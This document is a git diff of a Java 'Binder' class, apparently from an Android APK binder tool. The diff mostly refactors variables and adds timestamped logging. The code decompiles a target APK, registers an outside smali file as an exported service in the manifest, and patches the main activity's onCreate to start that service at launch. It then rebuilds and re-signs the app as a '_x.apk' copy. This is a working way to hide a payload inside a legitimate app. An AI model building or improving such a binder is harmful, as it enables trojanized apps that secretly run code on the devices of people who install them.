@@ -1,7 +1,6 @@
 package binder;
 
 import brut.apktool.Main;
-import orig.SignApk;
 import s.Sign;
 import utils.*;
 
@@ -9,13 +8,11 @@ import java.io.*;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
-import java.util.Timer;
-import java.util.TimerTask;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
 public class Binder {
     public interface ConsoleProcess{
@@ -23,11 +20,15 @@ public class Binder {
     }
     private ConsoleProcess consoleProcess;
     private Constants constants;
+    private File manifestFile, epSmaliFile, newSmaliFile, newApkFile, signedApkFile;
+    private String manifestContent, androidPackageName, epFilePath, smaliPackageName,  serviceElement, newSmaliFileContent, epSmaliFileContent, onCreateLine, serviceStarterSmali, onCreateMethod, oldMethod;
+    private Matcher manifestMatcher;
+    private int onCreateLineNum;
 
     public Binder(){
         constants = new Constants();
     }
-    public void decodeApk(File apkFile, ConsoleProcess consoleProcess){
+    public void decompileApk(File apkFile, ConsoleProcess consoleProcess){
         this.consoleProcess = consoleProcess;
         String[] args = new String[]{"d", "-f", apkFile.getPath().trim()};
         runApktool(apkFile, args);
@@ -82,48 +83,55 @@ public class Binder {
          * 3- Edit Smali file -> Start service
          * 4- Build and sign
          * */
+        printLog("Decompiling APK with ApkTool...");
         if(apkFile.exists() && smaliFile.exists()){
-            decodeApk(apkFile, output1 -> {
+            decompileApk(apkFile, output1 -> {
                 try {
+                    printLog("\n" + output1);
                     if(output1.split("I:")[output1.split("I:").length-1].contains("Copying original files...")) {  /* Check last info */
-                        File manifestFile = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\AndroidManifest.xml");
+                        manifestFile = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\AndroidManifest.xml");
                         if (!manifestFile.exists()) { throw new Exception(constants.MANIFEST_NOT_FOUND_ERROR); }
-                        String manifestContent = readFile(manifestFile.getPath()).replace("\n", "").replace("\r", "");
-                        Matcher manifestMatcher = constants.manifestPattern1.matcher(manifestContent);
-                        String androidName = "";
+                        printLog("Manifest file found: " + manifestFile.getName());
+                        printLog("Trying to find EntryPoint smali...");
+                        manifestContent = readFile(manifestFile.getPath()).replace("\n", "").replace("\r", "");
+                        System.out.println(manifestContent);
+                        manifestMatcher = constants.manifestPattern1.matcher(manifestContent);
                         if (manifestMatcher.find()){
-                            androidName = manifestMatcher.group(0).replace("<activity android:name=\"", "")
+                            androidPackageName = manifestMatcher.group(0).replace("<activity android:name=\"", "")
                                     .replaceAll("\">(.+?)<intent-filter>(.+?)+", "");
                         }
-                        if(androidName.length()<5 | androidName.split("[.]").length == 0){ throw new Exception(constants.MANIFEST_PARSE_ERROR);}
-                        String epFilePath = manifestFile.getParent() + "\\smali";
-                        for(int i = 0; i < androidName.split("[.]").length-1; i++){
-                            epFilePath += "\\" + androidName.split("[.]")[i];
+                        printLog("EntryPoint smali: " + androidPackageName);
+                        if(androidPackageName.length()<5 | androidPackageName.split("[.]").length == 0){ throw new Exception(constants.MANIFEST_PARSE_ERROR);}
+                        epFilePath = manifestFile.getParent() + "\\smali";
+                        for(int i = 0; i < androidPackageName.split("[.]").length-1; i++){
+                            epFilePath += "\\" + androidPackageName.split("[.]")[i];
                         }
-                        epFilePath += "\\" + androidName.split("[.]")[androidName.split("[.]").length-1] + ".smali";
-                        File epSmaliFile = new File(epFilePath);
+                        epFilePath += "\\" + androidPackageName.split("[.]")[androidPackageName.split("[.]").length-1] + ".smali";
+                        epSmaliFile = new File(epFilePath);
                         if(!epSmaliFile.exists()){throw new Exception(constants.EP_SMALI_NOT_FOUND_ERROR);}
                         /*Edit Manifest*/
-                        String smaliPackage = androidName.replace("."+androidName.split("[.]")[androidName.split("[.]").length-1], "") + "." +
+                        printLog("Changing manifest file...");
+                        smaliPackageName = androidPackageName.replace("."+ androidPackageName.split("[.]")[androidPackageName.split("[.]").length-1], "") + "." +
                                 getFilenameWithoutExtension(smaliFile.getName());
-                        String serviceElement = "<service android:enabled=\"true\" android:exported=\"true\" android:name=\""+ smaliPackage+ "\"/>";
+                        serviceElement = "<service android:enabled=\"true\" android:exported=\"true\" android:name=\""+ smaliPackageName + "\"/>";
                         if(!writeFile(manifestFile.getPath(), manifestContent.replace(manifestMatcher.group(0), manifestMatcher.group(0)+serviceElement))){
                             throw new Exception(constants.FILE_WRITE_ERROR);}
                         /*Copy smali and edit package*/
-                        File newSmaliFile = new File(epSmaliFile.getParent()+"\\"+smaliFile.getName());
+                        printLog("Moving and changing smali file...");
+                        newSmaliFile = new File(epSmaliFile.getParent()+"\\"+smaliFile.getName());
                         if(!copyFile(smaliFile.getPath(), newSmaliFile.getPath())){ throw new Exception(constants.FILE_COPY_ERROR);}
-                        String newSmaliFileContent = readFile(newSmaliFile.getPath()).replaceAll(".class(.+?)L(.+?)/(.+?);", ".class public L"+
-                                smaliPackage.replace(".", "/")+";");
+                        newSmaliFileContent = readFile(newSmaliFile.getPath()).replaceAll(".class(.+?)L(.+?)/(.+?);", ".class public L"+
+                                smaliPackageName.replace(".", "/")+";");
                         if(!writeFile(newSmaliFile.getPath(), newSmaliFileContent)){throw new Exception(constants.FILE_WRITE_ERROR);}
                         /*Edit EP File*/
-                        String epSmaliFileContent = readFile(epSmaliFile.getPath());
+                        printLog("Changing EntryPoint smali...");
+                        epSmaliFileContent = readFile(epSmaliFile.getPath());
                         if(!epSmaliFileContent.contains(".method protected onCreate")){ throw new Exception(constants.ONCREATE_NOT_FOUND_ERROR);}
+                        printLog("onCreate method found!");
                         String[] epLines = epSmaliFileContent.split(".method protected onCreate")[1].split(".line ");
-                        int onCreateLineNum;
-                        String onCreateLine, serviceStarterSmali;
-                        String onCreateMethod = ".method protected onCreate" + epSmaliFileContent.split(".method protected onCreate")[1]
+                        onCreateMethod = ".method protected onCreate" + epSmaliFileContent.split(".method protected onCreate")[1]
                                 .split(".end method")[0] + ".end method\n";
-                        String oldMethod = onCreateMethod;
+                        oldMethod = onCreateMethod;
                         boolean increment = false;
                         for(String epLine:epLines){
                             try{
@@ -133,8 +141,8 @@ public class Binder {
                                     onCreateLine = epLine.replace(String.valueOf(lineNum), "").replace("\n", "")
                                             .replace("\r", "").trim();
                                     serviceStarterSmali = "\n\n\t" + constants.service_starter_smali.replace("<line_num>", String.valueOf(onCreateLineNum+1))
-                                            .replace("<class_name>", androidName.replace(".", "/"))
-                                            .replaceAll("<service_name>", smaliPackage.replace(".", "/"));
+                                            .replace("<class_name>", androidPackageName.replace(".", "/"))
+                                            .replaceAll("<service_name>", smaliPackageName.replace(".", "/"));
                                     onCreateMethod =  onCreateMethod.replace(onCreateLine, onCreateLine + "" + serviceStarterSmali);
                                     increment = true;
                                 }
@@ -147,22 +155,30 @@ public class Binder {
                                 /*Cannot convert*/
                             }
                         }
+                        printLog("Building the APK...");
                         if(!writeFile(epSmaliFile.getPath(), epSmaliFileContent.replace(oldMethod, onCreateMethod))){ throw new Exception(constants.FILE_WRITE_ERROR);}
                         /*Build and Sign APK*/
                         buildApk(new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName())), output2 -> {
                             try {
+                                printLog("\n" + output2);
                                 if (output2.split("I:")[output2.split("I:").length - 1].contains("Built apk...")) {  /* Check last info */
-                                    File newApk = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\dist\\" + apkFile.getName());
-                                    if(!newApk.exists()){throw new Exception(constants.NEW_APK_NOT_FOUND_ERROR);}
+                                    newApkFile = new File(apkFile.getParent() + "\\" + getFilenameWithoutExtension(apkFile.getName()) + "\\dist\\" + apkFile.getName());
+                                    if(!newApkFile.exists()){throw new Exception(constants.NEW_APK_NOT_FOUND_ERROR);}
                                     TimeUnit.SECONDS.sleep(1);
-                                    signApk(newApk, output3 -> {
+                                    printLog("Signing...");
+                                    signApk(newApkFile, output3 -> {
                                         try {
                                             if (output3.equals("[+] Apk signed.")) {
-                                                File signedApk = new File(newApk.getParent() + "\\" + getFilenameWithoutExtension(newApk.getName())+".s.apk");
-                                                if(!signedApk.exists()){throw new Exception(constants.APK_SIGN_ERROR);}
-                                                if(!copyFile(signedApk.getPath(), apkFile.getParent() + "\\" +
+                                                signedApkFile = new File(newApkFile.getParent() + "\\" + getFilenameWithoutExtension(newApkFile.getName())+".s.apk");
+                                                if(!signedApkFile.exists()){throw new Exception(constants.APK_SIGN_ERROR);}
+                                                if(!copyFile(signedApkFile.getPath(), apkFile.getParent() + "\\" +
                                                         getFilenameWithoutExtension(apkFile.getName()) + "_x.apk")){throw new Exception(constants.FILE_COPY_ERROR);}
                                                         /* DONE */
+                                                printLog("APK signed. ~ done");
+                                                System.out.println();
+                                                printLog("New APK located at \"" + apkFile.getParent() + "\\" +
+                                                        getFilenameWithoutExtension(apkFile.getName()) + "_x.apk" + "\"");
+                                                // // TODO: 6/27/2018 Delete temp files
                                             } else {
                                                 throw new Exception(constants.APK_SIGN_ERROR);
                                             }
@@ -191,7 +207,6 @@ public class Binder {
         }else{
             System.out.println(constants.SMALI_NOT_FOUND_ERROR);
         }
-
     }
     private String readFile(String filePath){
         StringBuilder content = new StringBuilder();
@@ -231,8 +246,11 @@ public class Binder {
             return false;
         }
     }
+    private void printLog(String msg){
+        DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
+        System.out.println("[" + dateFormat.format(new Date()) + "] " + msg);
+    }
     private String getFilenameWithoutExtension(String filename){
         return filename.replaceFirst("[.][^.]+$", "");
     }
-
 }
